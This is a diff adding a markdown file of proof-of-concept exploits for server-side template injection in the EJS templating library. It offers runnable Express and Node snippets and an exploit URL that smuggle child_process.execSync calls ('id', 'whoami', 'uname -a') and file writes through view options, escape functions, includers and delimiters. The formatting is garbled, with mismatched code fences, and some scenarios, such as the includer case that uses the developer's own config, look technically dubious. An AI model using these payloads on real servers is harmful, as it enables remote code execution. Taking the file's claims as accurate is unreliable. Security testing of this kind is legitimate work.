@@ -1,0 +1,135 @@
+````md
+# EJS SSTI Exploitable Test Cases
+
+These test cases highlight critical server-side template injection vulnerabilities in EJS and illustrate how an auditor or penetration tester might leverage untrusted inputs to achieve remote code execution.
+
+_The following proof-of-concept scenarios demonstrate server-side template injection (SSTI) in EJS versions ≤ 3.1.10. All examples assume EJS is used with Express (or similar) and renders untrusted input without sanitization._
+
+---
+
+## Test Case 1 – Delimiter Injection via Express View Options
+
+```js
+// server.js
+const express = require('express');
+const app = express();
+app.set('view engine', 'ejs');
+app.set('view options', {});
+
+app.get('/user', (req, res) => {
+  // Merge query into view options
+  res.render('user', { name: req.query.name }, req.query['settings']?.['view options']);
+});
+
+// Run: ts-node server.js
+
+Exploit URL:
+````
+
+```
+http://localhost:3000/user?name=Alice&settings[view%20options][closeDelimiter]=1");require('child_process').execSync('id');//
+
+Effect: EJS inlines the malicious closeDelimiter, breaking out of the compiled template and executing id on the server.
+
+## Test Case 2 – Escape Function SSTI
+```
+
+```js
+// standalone-poc.js
+const ejs = require('ejs');
+const template = '<p>Hello, <%= name %>!</p>';
+
+// Attacker-supplied escapeFunction executes arbitrary code
+// This escape function writes a file to demonstrate arbitrary code execution
+const maliciousEscape = function() {
+  require('fs').writeFileSync('/tmp/pwned', 'compromised');
+};
+
+try {
+  ejs.render(template, { name: 'Bob' }, { client: true, escapeFunction: maliciousEscape });
+} catch (e) {
+  console.error('Compilation error:', e);
+}
+
+// Run: node standalone-poc.js
+
+Effect: When client: true, EJS calls escapeFunction.toString() and inlines it, causing the file write.
+
+## Test Case 3 – Async Template RCE
+```
+
+```js
+// async-poc.js
+const ejs = require('ejs');
+const asyncTemplate = '<% await runExploit() %>';
+
+const runExploit = async () => {
+  require('child_process').execSync('touch /tmp/async_exploit');
+};
+
+(async () => {
+  await ejs.render(asyncTemplate, {}, {
+    async: true,
+    client: true,
+    escapeFunction: runExploit
+  });
+})();
+
+// Run: ts-node async-poc.js
+
+Effect: Inlining runExploit.toString() triggers the touch command during template compilation.
+
+## Test Case 4 – Template Include Injection
+
+Configuration
+```
+
+---
+
+```js
+// include-poc.js (configuration)
+const express = require('express');
+const app = express();
+app.set('view engine', 'ejs');
+// Abusing the includer function to inject a malicious template
+app.set('view options', {
+  includer: (path, { filename }) => ({
+    // Execute 'uname -a' and return dummy content
+    filename,
+    template: `<%= (function(){ require('child_process').execSync('uname -a'); return 'x'; })() %>`
+  })
+});
+
+### Route Handler
+```
+
+```js
+// include-poc.js (route setup)
+app.get('/', (req, res) => {
+  // Render the 'index' view, triggering the malicious includer
+  res.render('index');
+});
+
+app.listen(3000, () => console.log('Server running on http://localhost:3000'));
+Effect: The malicious includer executes uname -a on the server before rendering the view.
+
+## Test Case 5 – OpenDelimiter Injection
+```
+
+```js
+// open-delimiter-poc.js
+const ejs = require('ejs');
+const template = '<p>Test</p>';
+
+ejs.render(template, {}, {
+  delimiter: `");require('child_process').execSync('whoami');//`
+});
+
+// Run: node open-delimiter-poc.js
+Effect: Malicious delimiter closes the parsing context and runs whoami on the host.
+
+Mitigation: Disable client-side compilation or sanitize all template options. Alternatively, patch lib/ejs.js to remove the opts.client branch that inlines untrusted function sources.
+```
+
+```
+```
